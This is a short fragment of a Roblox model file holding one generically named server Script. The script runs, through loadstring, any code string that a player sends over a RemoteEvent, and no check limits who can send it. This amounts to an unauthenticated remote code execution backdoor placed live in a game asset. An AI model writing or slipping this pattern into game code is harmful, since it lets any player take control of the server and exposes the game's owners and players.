				<Item class="Script" referent="RBX11">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script</string>
						<ProtectedString name="Source">local remote = script.Parent.RemoteEvent
remote.OnServerEvent:connect(function(player , code)
    local exec, err = loadstring(code)
    if exec then
        exec()
    else
        print(&quot;Error : &quot; .. tostring(err))
    end
end)</ProtectedString>
					</Properties>
